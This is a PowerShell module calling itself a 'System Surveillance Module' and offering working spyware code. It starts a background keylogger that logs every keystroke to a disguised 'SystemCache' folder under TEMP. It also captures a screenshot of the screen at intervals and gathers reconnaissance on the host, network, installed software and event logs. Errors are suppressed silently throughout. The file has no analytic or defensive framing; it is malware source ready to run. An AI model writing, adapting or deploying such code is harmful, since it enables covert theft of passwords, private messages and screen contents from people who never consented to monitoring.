<#
.SYNOPSIS
    System Surveillance Module
.DESCRIPTION
    Provides keylogging, screenshot capture, and system monitoring capabilities
#>

# Add Windows Forms for screenshot capability
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

function Start-SystemSurveillance {
    param(
        [hashtable]$Config
    )
    
    try {
        $Success = $false
        
        # Start keylogger
        if (Start-Keylogger -Config $Config) {
            $Success = $true
        }
        
        # Start screenshot capture
        if (Start-ScreenshotCapture -Config $Config) {
            $Success = $true
        }
        
        # Start system information collection
        if (Start-SystemInfoCollection -Config $Config) {
            $Success = $true
        }
        
        return $Success
    }
    catch {
        Write-Error "Surveillance setup failed: $($_.Exception.Message)"
        return $false
    }
}

function Start-Keylogger {
    param(
        [hashtable]$Config
    )
    
    try {
        # Create log file
        $LogFile = Join-Path $env:TEMP "SystemCache\keylog.txt"
        $LogDir = Split-Path $LogFile -Parent
        if (-not (Test-Path $LogDir)) {
            New-Item -ItemType Directory -Path $LogDir -Force | Out-Null
        }
        
        # Start keylogger job
        Start-Job -ScriptBlock {
            param($LogFile)
            
            # Load Windows API for keylogging
            Add-Type -TypeDefinition @"
                using System;
                using System.Runtime.InteropServices;
                using System.Windows.Forms;
                
                public class KeyLogger {
                    [DllImport("user32.dll")]
                    public static extern short GetAsyncKeyState(int vKey);
                    
                    [DllImport("user32.dll")]
                    public static extern int GetKeyboardState(byte[] lpKeyState);
                    
                    [DllImport("user32.dll")]
                    public static extern int MapVirtualKey(int uCode, int uMapType);
                    
                    [DllImport("user32.dll")]
                    public static extern int ToUnicode(int wVirtKey, int wScanCode, byte[] lpKeyState, System.Text.StringBuilder pwszBuff, int cchBuff, int wFlags);
                }
"@
            
            $Keys = @{
                8 = "[BACKSPACE]"
                9 = "[TAB]"
                13 = "[ENTER]"
                27 = "[ESC]"
                32 = " "
                46 = "[DELETE]"
            }
            
            $Buffer = ""
            $LastKey = 0
            
            while ($true) {
                Start-Sleep -Milliseconds 10
                
                for ($i = 1; $i -le 255; $i++) {
                    $KeyState = [KeyLogger]::GetAsyncKeyState($i)
                    
                    if ($KeyState -eq -32767) {  # Key pressed
                        if ($Keys.ContainsKey($i)) {
                            $Buffer += $Keys[$i]
                        }
                        else {
                            $Char = [char]$i
                            if ($Char -match '[a-zA-Z0-9\s\W]') {
                                $Buffer += $Char
                            }
                        }
                        
                        $LastKey = $i
                    }
                }
                
                # Flush buffer every 100 characters or every 5 seconds
                if ($Buffer.Length -gt 100 -or ((Get-Date).Second % 5 -eq 0 -and $Buffer.Length -gt 0)) {
                    $Timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
                    $LogEntry = "[$Timestamp] $Buffer`n"
                    Add-Content -Path $LogFile -Value $LogEntry -Encoding UTF8
                    $Buffer = ""
                }
            }
        } -ArgumentList $LogFile | Out-Null
        
        return $true
    }
    catch {
        return $false
    }
}

function Start-ScreenshotCapture {
    param(
        [hashtable]$Config
    )
    
    try {
        $ScreenshotDir = Join-Path $env:TEMP "SystemCache\Screenshots"
        if (-not (Test-Path $ScreenshotDir)) {
            New-Item -ItemType Directory -Path $ScreenshotDir -Force | Out-Null
        }
        
        # Start screenshot job
        Start-Job -ScriptBlock {
            param($ScreenshotDir, $Interval)
            
            while ($true) {
                try {
                    Start-Sleep -Seconds $Interval
                    
                    $Timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
                    $ScreenshotPath = Join-Path $ScreenshotDir "screenshot_$Timestamp.png"
                    
                    # Capture screenshot
                    $Screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
                    $Bitmap = New-Object System.Drawing.Bitmap $Screen.Width, $Screen.Height
                    $Graphics = [System.Drawing.Graphics]::FromImage($Bitmap)
                    $Graphics.CopyFromScreen($Screen.Left, $Screen.Top, 0, 0, $Screen.Size)
                    $Graphics.Dispose()
                    
                    # Save screenshot
                    $Bitmap.Save($ScreenshotPath, [System.Drawing.Imaging.ImageFormat]::Png)
                    $Bitmap.Dispose()
                    
                    # Clean old screenshots (keep last 10)
                    $OldScreenshots = Get-ChildItem -Path $ScreenshotDir -Filter "*.png" | Sort-Object LastWriteTime -Descending | Select-Object -Skip 10
                    foreach ($OldScreenshot in $OldScreenshots) {
                        Remove-Item $OldScreenshot.FullName -Force
                    }
                }
                catch {
                    # Continue silently
                }
            }
        } -ArgumentList $ScreenshotDir, $Config.ScreenshotInterval | Out-Null
        
        return $true
    }
    catch {
        return $false
    }
}

function Start-SystemInfoCollection {
    param(
        [hashtable]$Config
    )
    
    try {
        $InfoFile = Join-Path $env:TEMP "SystemCache\system_info.txt"
        
        # Collect system information
        $SystemInfo = @{
            ComputerName = $env:COMPUTERNAME
            UserName = $env:USERNAME
            Domain = $env:USERDOMAIN
            OS = (Get-WmiObject -Class Win32_OperatingSystem).Caption
            Version = (Get-WmiObject -Class Win32_OperatingSystem).Version
            Architecture = (Get-WmiObject -Class Win32_ComputerSystem).SystemType
            Processor = (Get-WmiObject -Class Win32_Processor).Name
            Memory = [math]::Round((Get-WmiObject -Class Win32_ComputerSystem).TotalPhysicalMemory / 1GB, 2)
            IPAddress = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.IPAddress -notlike "127.*" -and $_.IPAddress -notlike "169.*"}).IPAddress
            MACAddress = (Get-WmiObject -Class Win32_NetworkAdapter | Where-Object {$_.NetEnabled -eq $true}).MACAddress
            InstalledSoftware = (Get-WmiObject -Class Win32_Product | Select-Object Name, Version | ConvertTo-Json -Compress)
            RunningServices = (Get-Service | Where-Object {$_.Status -eq "Running"} | Select-Object Name, DisplayName | ConvertTo-Json -Compress)
            NetworkConnections = (Get-NetTCPConnection | Where-Object {$_.State -eq "Listen"} | Select-Object LocalAddress, LocalPort, State | ConvertTo-Json -Compress)
            Timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
        }
        
        # Save system information
        $SystemInfo | ConvertTo-Json -Depth 10 | Out-File -FilePath $InfoFile -Encoding UTF8
        
        return $true
    }
    catch {
        return $false
    }
}

function Get-SystemLogs {
    param(
        [string]$LogType = "Application",
        [int]$MaxEvents = 100
    )
    
    try {
        $LogFile = Join-Path $env:TEMP "SystemCache\windows_logs.txt"
        
        # Get Windows Event Logs
        $Events = Get-WinEvent -LogName $LogType -MaxEvents $MaxEvents | ForEach-Object {
            @{
                TimeCreated = $_.TimeCreated
                Level = $_.LevelDisplayName
                Message = $_.Message
                Source = $_.ProviderName
            }
        }
        
        $Events | ConvertTo-Json -Depth 10 | Out-File -FilePath $LogFile -Encoding UTF8
        
        return $true
    }
    catch {
        return $false
    }
}

function Stop-SystemSurveillance {
    # Stop all surveillance jobs
    Get-Job | Where-Object {$_.Name -like "*Surveillance*" -or $_.Command -like "*KeyLogger*" -or $_.Command -like "*Screenshot*"} | Stop-Job
    Get-Job | Where-Object {$_.Name -like "*Surveillance*" -or $_.Command -like "*KeyLogger*" -or $_.Command -like "*Screenshot*"} | Remove-Job
} 